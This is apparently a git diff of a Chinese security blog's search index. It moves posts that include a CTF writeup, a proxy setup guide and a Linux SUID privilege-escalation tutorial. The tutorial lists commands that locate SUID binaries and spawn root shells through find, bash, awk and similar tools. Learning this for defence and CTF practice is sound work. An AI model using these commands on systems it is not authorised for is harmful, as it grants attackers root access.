-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182211807.png"
-                        alt="image-20240923182211807"
-                 ></p>
-<p>用CyberChef提取，注意后面的注释不要一起提取出来</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/11111111.png"
-                        alt="11111111"
-                 ></p>
-<p>继续往下查看，可以找到 openssl 加密的密钥：P@ssW0rdddd</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240923182320920.png"
-                        alt="image-20240923182320920"
-                 ></p>
-<p>然后只要安装openssl-1.0.2-k，使用得到的密钥解密即可</p>
-<p>具体安装步骤如下，编译完成后openssl可执行文件在apps目录下</p>
-<blockquote>
-<p>wget <a class="link"   href="https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz" >https://www.openssl.org/source/old/1.0.2/openssl-1.0.2k.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
-<p>tar -xzvf openssl-1.0.2k.tar.gz</p>
-<p>cd openssl-1.0.2k.tar.gz</p>
-<p>./config --prefix=/usr/</p>
-<p>make</p>
-</blockquote>
-<p>使用以下命令解密即可得到flag：DASCTF{c086cd55-b86a-4ee6-8933-c8bee578148a}</p>
-<blockquote>
-<p>./openssl-1.0.2k/apps/openssl enc -d -aes256 -in download.bin -out flag.tar.gz -k P@ssW0rdddd</p>
-</blockquote>
-<h3 id="ez-wav">ez_wav</h3>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240711.png"
-                        alt="das240711"
-                 ></p>
-<p>打开key.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/das240712.png"
-                        alt="das240712"
-                 ></p>
-<p>可知key文件经过如上流程变成look.txt文件。我们需要根据这个流程逆回key文件</p>
-<blockquote>
-<p>信号源——》xor-&gt;数据类型转换-&gt;相乘一个常数-&gt;写入</p>
-<p>下面的Vector Source提供的一个脉冲信号</p>
-</blockquote>
-<p>exp如下</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/04e83e72-8324-40b3-8d14-0cf50565178e.png"
-                        alt="04e83e72-8324-40b3-8d14-0cf50565178e"
-                 ></p>
-<p>010打开后得到密码 good_job</p>
-<p>打开flag.grc</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/2fba9b78-9356-4852-aa1a-8aadee4dee85.png"
-                        alt="2fba9b78-9356-4852-aa1a-8aadee4dee85"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/8209f61b-1618-48de-8084-75189f5b1fa8.png"
-                        alt="8209f61b-1618-48de-8084-75189f5b1fa8"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/4bda376f-8a5f-450b-88b4-357a057b85e2.png"
-                        alt="4bda376f-8a5f-450b-88b4-357a057b85e2"
-                 ></p>
-<p>如果我们想要抵消载波的影响，那么就需要给他相乘一个相反的波形，下面是AM解调过程</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/893acd65-17e9-48ab-9221-b84a454b27c0.png"
-                        alt="893acd65-17e9-48ab-9221-b84a454b27c0"
-                 ></p>
-<p>听flag即可</p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-      <tags>
-        <tag>Misc</tag>
-      </tags>
   </entry>
   <entry>
     <title>学习反弹shell</title>
@@ -2435,6 +2435,92 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       </categories>
   </entry>
   <entry>
+    <title>科学上网指北</title>
+    <url>//post/VPNuse/</url>
+    <content><![CDATA[<h1>仅供学术讨论使用 造成任何后果自负</h1>
+<h3 id="代理软件">代理软件</h3>
+<h4 id="Clash-Verge">Clash Verge</h4>
+<p>GitHub Releases地址：<a class="link"   href="https://github.com/clash-verge-rev/clash-verge-rev/releases" >Releases · clash-verge-rev/clash-verge-rev<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Windows、MacOS、Linux</p>
+<h4 id="Clash-Meta-For-Android">Clash Meta For Android</h4>
+<p>GitHub Releases地址：<a class="link"   href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases" >Releases · MetaCubeX/ClashMetaForAndroid<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Android</p>
+<h4 id="Surfboard">Surfboard</h4>
+<p><a class="link"   href="https://github.com/getsurfboard/surfboard/releases" >Releases · getsurfboard/surfboard<i class="fas fa-external-link-alt"></i></a></p>
+<p>适用于Android</p>
+<h4 id="Shadowrocket">Shadowrocket</h4>
+<p><a class="link"   href="https://apps.apple.com/us/app/shadowrocket/id932747118" >‎Shadowrocket on the App Store<i class="fas fa-external-link-alt"></i></a> （售价2.99美元不含税）</p>
+<p>注：iOS需美区ID，此处仅提供App Store链接</p>
+<h3 id="机场购买">机场购买</h3>
+<p>此处可使用现有机场或进行新购买，在此推广星云：<a class="link"   href="https://www.xxxlssop.one/#/register?code=iGLGFrhC%EF%BC%8C%E6%9C%80%E4%BD%8E5%E5%85%83/%E6%9C%88%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%AD%A5%E9%AA%A4%E5%B0%86%E4%BB%A5Clash" >https://www.xxxlssop.one/#/register?code=iGLGFrhC，最低5元/月。接下来步骤将以Clash<i class="fas fa-external-link-alt"></i></a> For Windows + 星云为例</p>
+<h3 id="配置">配置</h3>
+<ul>
+<li>购买订阅后，在星云仪表盘中选择一键订阅，在展开框中选择复制订阅地址。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113702905.png"
+                        alt="image-20250410113702905"
+                 ></p>
+<ul>
+<li>下载并安装完成Clash Verge后，选择左侧第三个订阅，复制订阅地址后选择导入，点击出现的星云方框后左侧会显示蓝色，此时代表选中。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113841223.png"
+                        alt="image-20250410113841223"
+                 ></p>
+<ul>
+<li>在左侧第二个代理中选择可连通且延迟较低的节点并选中。顶部可选择：全局代理，所有流量都会经过代理进行访问，规则代理，访问部分网站时会根据已有规则不经代理访问，直连为直接连接，所有流量不走代理。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113947586.png"
+                        alt="image-20250410113947586"
+                 ></p>
+<ul>
+<li>General界面中，System Proxy为系统代理开关，开启后状态栏内小猫会变成黄色，其他选项如图配置即可，注意Clash默认端口为7890，和宽带连接上网相同，且由于Clash问题，若宽带连接名称为中文也会失效，故需要使用PPPoE的用户建议修改Clash端口，并将宽带连接名称改为英文，如PPPoE。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223716267.png"
+                        alt="image-20240307223716267"
+                 ></p>
+<ul>
+<li>Clash Verge同理，但是Clash Verge默认端口为7897，所以不会存在上述问题</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410114107049.png"
+                        alt="image-20250410114107049"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223843654.png"
+                        alt="image-20240307223843654"
+                 ></p>
+<ul>
+<li>配置完成后可访问<a class="link"   href="https://www.google.com/" >Google<i class="fas fa-external-link-alt"></i></a>进行连通性测试，如果成功连通则会正常显示。</li>
+</ul>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307224342765.png"
+                        alt="image-20240307224342765"
+                 ></p>
+<p>TUN模式：虚拟网卡模式，本机所有流量（包括浏览器、APP、终端、虚拟机等）都会经过一张“虚拟网卡”再进行代理，可以简单理解为“真·全局模式”，但是部分古久版本开启TUN后会使得网络图标变成小地球，新版本会显示为以太网，这些都是正常选项</p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+  </entry>
+  <entry>
     <title>WSL安装和使用</title>
     <url>//post/WSL/</url>
     <content><![CDATA[<h3 id="启用Windows功能">启用Windows功能</h3>
@@ -2457,7 +2543,7 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
 </blockquote>
 <h4 id="Hyper-V安装脚本">Hyper-V安装脚本</h4>
 <p>新建一个HyperV-Install.cmd文件，将以下内容复制进去，右键使用管理员身份运行，安装完成后重启计算机即可</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pushd</span> <span class="string">&quot;%~dp0&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /b %SystemRoot%\servicing\Packages\*Hyper<span class="literal">-V</span>*.mum &gt;hyper<span class="literal">-v</span>.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (<span class="string">&#x27;findstr /i . hyper-v.txt 2^&gt;nul&#x27;</span>) <span class="keyword">do</span> dism /online /norestart /<span class="built_in">add-package</span>:<span class="string">&quot;%SystemRoot%\servicing\Packages\%%i&quot;</span></span><br><span class="line"><span class="built_in">del</span> hyper<span class="literal">-v</span>.txt</span><br><span class="line">Dism /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Hyper-V-All</span> /LimitAccess /ALL</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pushd</span> <span class="string">&quot;%~dp0&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /b %SystemRoot%\servicing\Packages\*Hyper<span class="literal">-V</span>*.mum &gt;hyper<span class="literal">-v</span>.txt</span><br><span class="line"><span class="keyword">for</span> /f %%i <span class="keyword">in</span> (<span class="string">&#x27;findstr /i . hyper-v.txt 2^&gt;nul&#x27;</span>) <span class="keyword">do</span> dism /online /norestart /<span class="built_in">add-package</span>:<span class="string">&quot;%SystemRoot%\servicing\Packages\%%i&quot;</span></span><br><span class="line"><span class="built_in">del</span> hyper<span class="literal">-v</span>.txt</span><br><span class="line">Dism /online /<span class="built_in">enable-feature</span> /featurename:Microsoft<span class="literal">-Hyper-V</span> <span class="literal">-All</span> /LimitAccess /ALL</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>
 <p>如果遇到文件后缀名未显示的情况，打开Windows文件管理器，在正上方的 查看 - 显示 - 文件扩展名，勾选即可</p>
 <h4 id="修改为专业版（推荐）">修改为专业版（推荐）</h4>
 <p>在设置 - 系统 - 激活页面选择更改产品密钥，在终端管理员内使用以下命令</p>
@@ -2634,92 +2720,6 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
                         alt="image-20250116152411627"
                  ></p>
 <p>如果该图标消失，可以在文件资源管理器顶部输入<code>\\wsl$</code>进行图形化文件交互，如果想让该图标重新出现，则可以在<a class="link"   href="https://github.com/microsoft/WSL/releases/" >Releases · microsoft/WSL<i class="fas fa-external-link-alt"></i></a>中重新下载WSL，安装后重启文件资源管理器进程即可</p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>科学上网指北</title>
-    <url>//post/VPNuse/</url>
-    <content><![CDATA[<h1>仅供学术讨论使用 造成任何后果自负</h1>
-<h3 id="代理软件">代理软件</h3>
-<h4 id="Clash-Verge">Clash Verge</h4>
-<p>GitHub Releases地址：<a class="link"   href="https://github.com/clash-verge-rev/clash-verge-rev/releases" >Releases · clash-verge-rev/clash-verge-rev<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Windows、MacOS、Linux</p>
-<h4 id="Clash-Meta-For-Android">Clash Meta For Android</h4>
-<p>GitHub Releases地址：<a class="link"   href="https://github.com/MetaCubeX/ClashMetaForAndroid/releases" >Releases · MetaCubeX/ClashMetaForAndroid<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Android</p>
-<h4 id="Surfboard">Surfboard</h4>
-<p><a class="link"   href="https://github.com/getsurfboard/surfboard/releases" >Releases · getsurfboard/surfboard<i class="fas fa-external-link-alt"></i></a></p>
-<p>适用于Android</p>
-<h4 id="Shadowrocket">Shadowrocket</h4>
-<p><a class="link"   href="https://apps.apple.com/us/app/shadowrocket/id932747118" >‎Shadowrocket on the App Store<i class="fas fa-external-link-alt"></i></a> （售价2.99美元不含税）</p>
-<p>注：iOS需美区ID，此处仅提供App Store链接</p>
-<h3 id="机场购买">机场购买</h3>
-<p>此处可使用现有机场或进行新购买，在此推广星云：<a class="link"   href="https://www.xxxlssop.one/#/register?code=iGLGFrhC%EF%BC%8C%E6%9C%80%E4%BD%8E5%E5%85%83/%E6%9C%88%E3%80%82%E6%8E%A5%E4%B8%8B%E6%9D%A5%E6%AD%A5%E9%AA%A4%E5%B0%86%E4%BB%A5Clash" >https://www.xxxlssop.one/#/register?code=iGLGFrhC，最低5元/月。接下来步骤将以Clash<i class="fas fa-external-link-alt"></i></a> For Windows + 星云为例</p>
-<h3 id="配置">配置</h3>
-<ul>
-<li>购买订阅后，在星云仪表盘中选择一键订阅，在展开框中选择复制订阅地址。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113702905.png"
-                        alt="image-20250410113702905"
-                 ></p>
-<ul>
-<li>下载并安装完成Clash Verge后，选择左侧第三个订阅，复制订阅地址后选择导入，点击出现的星云方框后左侧会显示蓝色，此时代表选中。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113841223.png"
-                        alt="image-20250410113841223"
-                 ></p>
-<ul>
-<li>在左侧第二个代理中选择可连通且延迟较低的节点并选中。顶部可选择：全局代理，所有流量都会经过代理进行访问，规则代理，访问部分网站时会根据已有规则不经代理访问，直连为直接连接，所有流量不走代理。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410113947586.png"
-                        alt="image-20250410113947586"
-                 ></p>
-<ul>
-<li>General界面中，System Proxy为系统代理开关，开启后状态栏内小猫会变成黄色，其他选项如图配置即可，注意Clash默认端口为7890，和宽带连接上网相同，且由于Clash问题，若宽带连接名称为中文也会失效，故需要使用PPPoE的用户建议修改Clash端口，并将宽带连接名称改为英文，如PPPoE。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223716267.png"
-                        alt="image-20240307223716267"
-                 ></p>
-<ul>
-<li>Clash Verge同理，但是Clash Verge默认端口为7897，所以不会存在上述问题</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20250410114107049.png"
-                        alt="image-20250410114107049"
-                 ></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307223843654.png"
-                        alt="image-20240307223843654"
-                 ></p>
-<ul>
-<li>配置完成后可访问<a class="link"   href="https://www.google.com/" >Google<i class="fas fa-external-link-alt"></i></a>进行连通性测试，如果成功连通则会正常显示。</li>
-</ul>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240307224342765.png"
-                        alt="image-20240307224342765"
-                 ></p>
-<p>TUN模式：虚拟网卡模式，本机所有流量（包括浏览器、APP、终端、虚拟机等）都会经过一张“虚拟网卡”再进行代理，可以简单理解为“真·全局模式”，但是部分古久版本开启TUN后会使得网络图标变成小地球，新版本会显示为以太网，这些都是正常选项</p>
 ]]></content>
       <categories>
         <category>环境配置</category>
@@ -2998,200 +2998,6 @@ hook密文，发现密文没有改变，那改变的可能是输入的flag数据
       <categories>
         <category>环境配置</category>
       </categories>
-  </entry>
-  <entry>
-    <title>2024 楚彗杯 超级WriteUp</title>
-    <url>//post/sbchb666/</url>
-    <content><![CDATA[<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#CRYPTO-ddd" >2024 天山固网杯决赛 部分WP - m0h31h31<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://dexterjie.github.io/2024/12/01/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/2024%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A6%8F%E5%BB%BA%E7%9C%81%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2024第二届福建省数据安全大赛<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.jacki.cn/2024/11/29/%E5%A4%A9%E5%B1%B1%E5%9B%BA%E7%BD%91/#REVERSE-bouquet" >天山固网<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132964576" >2023黑龙江省赛<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/luochen2436/article/details/132138412" >CTF Crypto — 七八月份比赛杂题记录_ctf替换了部分模型权重-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://dexterjie.github.io/2023/09/17/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81%E8%B5%9B/#%E5%86%B3%E8%B5%9B" >黑龙江省赛 | DexterJie’Blog<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://blog.csdn.net/qq_42880719/article/details/126175056" >蓝帽杯2022年半决赛 writeup(附取证题目+解压密码+附件)_2022蓝帽杯半决赛-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://hwlanxiaojun.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9D%AF%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E8%A7%A3/#0x-04-awdshell" >安恒杯四月月赛题解<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="http://www.andynoel.xyz/?p=416" >2022 BluehatCup Semi-Finals | Partly Writeup – AndyNoel’s Blog<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://c-lby.top/2024/2024YLCTF-1/" >『YLCTF 源鲁杯 2024』 PWN-1 WP | C_LBY’s BLOG<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://mp.weixin.qq.com/s/me3pY_xa2RIHOncin9B5QA" >2024年福建省大学生数据安全大赛-技能实践赛决赛<i class="fas fa-external-link-alt"></i></a></p>
-<p><a class="link"   href="https://www.lo-ve.cn/index.php/archives/65/" >2024第二届福建省数据安全大赛-浅兮<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>题解</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>浅析Linux SUID提权</title>
-    <url>//post/suidtq/</url>
-    <content><![CDATA[<h3 id="什么是SUID">什么是SUID</h3>
-<p>SUID（Set User ID）是文件权限的一种特殊位，表示当一个可执行文件被执行时，它会以文件拥有者的权限运行，而不是以执行者的权限运行。 也就是说，<strong>如果该程序有SUID权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</strong></p>
-<p>Linux 系统中引入了三个主要文件来管理用户和用户组的信息：</p>
-<ul>
-<li>
-<p><strong><code>/etc/passwd</code></strong>：</p>
-<ul>
-<li>存储用户的基本信息，例如用户名、用户ID（UID）、组ID（GID）等。</li>
-<li>每个用户对应一行信息。</li>
-</ul>
-<p><code>/etc/passwd</code> 文件中，每一行表示一个用户的信息，包含7个字段，用冒号（<code>:</code>）分隔。具体字段含义如下：</p>
-<table>
-<thead>
-<tr>
-<th>编号</th>
-<th>字段名</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><strong>1</strong></td>
-<td>用户名（login name）</td>
-<td>用户的登录名，用于标识用户，必须是唯一的，如<code>root</code>、<code>user1</code>等。</td>
-</tr>
-<tr>
-<td><strong>2</strong></td>
-<td>密码占位符</td>
-<td>传统上存储加密密码，但现在存储的是占位符<code>x</code>，实际密码存储在<code>/etc/shadow</code>中。</td>
-</tr>
-<tr>
-<td><strong>3</strong></td>
-<td>用户ID（UID）</td>
-<td>每个用户都有一个唯一的用户ID，用于标识用户。例如<code>0</code>表示超级用户<code>root</code>，普通用户的UID一般从1000开始。</td>
-</tr>
-<tr>
-<td><strong>4</strong></td>
-<td>组ID（GID）</td>
-<td>用户所属组的ID，用于标识用户的主组。主组的详细信息存储在<code>/etc/group</code>中。</td>
-</tr>
-<tr>
-<td><strong>5</strong></td>
-<td>备注信息</td>
-<td>说明或备注字段，通常存放用户的全名或其他信息，可以为空。</td>
-</tr>
-<tr>
-<td><strong>6</strong></td>
-<td>用户主目录</td>
-<td>用户的默认主目录，通常是<code>/home/用户名</code>，也可以指定其他目录。</td>
-</tr>
-<tr>
-<td><strong>7</strong></td>
-<td>登录Shell</td>
-<td>用户登录时的默认Shell。例如<code>/bin/bash</code>（可登录），或<code>/sbin/nologin</code>（不允许登录）。</td>
-</tr>
-</tbody>
-</table>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127210337810.png"
-                        alt="image-20241127210337810"
-                 ></p>
-</li>
-<li>
-<p><strong><code>/etc/shadow</code></strong>：</p>
-<ul>
-<li>专门存储用户的密码信息（加密后的密码）。</li>
-<li>只有root用户或具有足够权限的用户可以访问这个文件。</li>
-</ul>
-</li>
-<li>
-<p><strong><code>/etc/group</code></strong>：</p>
-<ul>
-<li>存储系统中所有组的信息，例如组名、组ID（GID）以及组内的成员。</li>
-</ul>
-</li>
-</ul>
-<h3 id="利用SUID提权的原理">利用SUID提权的原理</h3>
-<p>如果一个文件的属主是 <strong>root</strong> 且设置了 <strong>SUID</strong>，即使是普通用户执行该文件，程序运行时也会以 <strong>root</strong> 权限执行；系统中的用户如果 <strong>UID=0</strong>，将被视为 <strong>root</strong> 用户。因此，若普通用户的 UID 被设为 0，登录后将自动拥有 <strong>root</strong> 权限。利用此特性，就可通过SUID进行提权。</p>
-<h3 id="如何设置SUID">如何设置SUID</h3>
-<h3 id="设置-SUID-权限">设置 SUID 权限</h3>
-<ul>
-<li>
-<p><strong>查看文件当前权限：</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l filename</span><br></pre></td></tr></table></figure>
-<p>输出的权限中，没有 <code>s</code> 则表示尚未设置 SUID。</p>
-</li>
-<li>
-<p><strong>设置 SUID：</strong> 使用 <code>chmod</code> 命令给文件设置 SUID 位：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> u+s filename</span><br></pre></td></tr></table></figure>
-<ul>
-<li><code>u+s</code> 表示给文件所有者（user）增加 SUID 权限。</li>
-</ul>
-</li>
-<li>
-<p><strong>确认设置结果：</strong> 再次查看文件权限：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -al filename</span><br></pre></td></tr></table></figure>
-<p>如果文件权限中显示类似 <code>-rwsr-xr-x</code>（注意 <code>s</code>），说明 SUID 设置成功。</p>
-</li>
-</ul>
-<h3 id="如何查找已有SUID的文件">如何查找已有SUID的文件</h3>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#find / -perm -u=s -type f 2&gt;/dev/null</span></span><br><span class="line"><span class="comment">#/表示从文件系统的顶部（根）开始并找到每个目录</span></span><br><span class="line"><span class="comment">#-perm 表示搜索随后的权限</span></span><br><span class="line"><span class="comment">#-u = s表示查找root用户拥有的文件</span></span><br><span class="line"><span class="comment">#-4000：查找 SUID 文件（权限位的 SUID 为 4）</span></span><br><span class="line"><span class="comment">#-type表示我们正在寻找的文件类型</span></span><br><span class="line"><span class="comment">#f 表示常规文件，而不是目录或特殊文件</span></span><br><span class="line"><span class="comment">#2表示该进程的第二个文件描述符，即stderr（标准错误）</span></span><br><span class="line"><span class="comment">#&gt;表示重定向</span></span><br><span class="line"><span class="comment">#/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。</span></span><br></pre></td></tr></table></figure>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241127212535096.png"
-                        alt="image-20241127212535096"
-                 ></p>
-<h3 id="进行SUID提权">进行SUID提权</h3>
-<p>前提：所使用的命令必须有SUID权限</p>
-<h4 id="find命令提权">find命令提权</h4>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#先前利用以上查找suid文件查询到了/usr/bin/find 有suid权限</span></span><br><span class="line"></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> <span class="built_in">whoami</span> \; -quit</span><br><span class="line"><span class="comment">#root</span></span><br><span class="line">find 任意文件 -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line"><span class="comment">#root</span></span><br><span class="line"><span class="built_in">touch</span> 1.txt <span class="comment">#创建1.txt</span></span><br><span class="line">/usr/bin/find 1.txt -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure>
-<h4 id="其他命令提权">其他命令提权</h4>
-<table>
-<thead>
-<tr>
-<th style="text-align:left">suid文件</th>
-<th style="text-align:left">提权命令</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:left">/usr/bin/bash</td>
-<td style="text-align:left">bash -p</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/csh</td>
-<td style="text-align:left">csh -b</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/sh</td>
-<td style="text-align:left">sh -p</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/ksh</td>
-<td style="text-align:left">ksh -p</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/zsh</td>
-<td style="text-align:left">zsh</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/find</td>
-<td style="text-align:left">find /etc/passwd -exec /bin/bash -p ;</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/awk</td>
-<td style="text-align:left">awk ‘BEGIN {system(“/bin/bash”)}’</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/man</td>
-<td style="text-align:left">!/bin/bash</td>
-</tr>
-<tr>
-<td style="text-align:left">/usr/bin/more</td>
-<td style="text-align:left">!/bin/bash</td>
-</tr>
-</tbody>
-</table>
-<p>可以查阅：<a class="link"   href="https://gtfobins.github.io/" >https://gtfobins.github.io/<i class="fas fa-external-link-alt"></i></a></p>
-<p>离线版：<a class="link"   href="https://github.com/nccgroup/GTFOBLookup" >https://github.com/nccgroup/GTFOBLookup<i class="fas fa-external-link-alt"></i></a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gtfoblookup gtfobins search find</span><br><span class="line"><span class="comment">#在gtfobins库中查找find命令</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>学习记录</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
   </entry>
   <entry>
     <title>Python沙盒逃逸深度学习</title>
@@ -4124,6 +3930,200 @@ or summary contain a given string such as “spam”, type “modules spam”.</
       </tags>
   </entry>
   <entry>
+    <title>浅析Linux SUID提权</title>
+    <url>//post/suidtq/</url>
+    <content><![CDATA[<h3 id="什么是SUID">什么是SUID</h3>
+<p>SUID（Set User ID）是文件权限的一种特殊位，表示当一个可执行文件被执行时，它会以文件拥有者的权限运行，而不是以执行者的权限运行。 也就是说，<strong>如果该程序有SUID权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</strong></p>
+<p>Linux 系统中引入了三个主要文件来管理用户和用户组的信息：</p>
+<ul>
+<li>
+<p><strong><code>/etc/passwd</code></strong>：</p>
+<ul>
+<li>存储用户的基本信息，例如用户名、用户ID（UID）、组ID（GID）等。</li>
+<li>每个用户对应一行信息。</li>
+</ul>
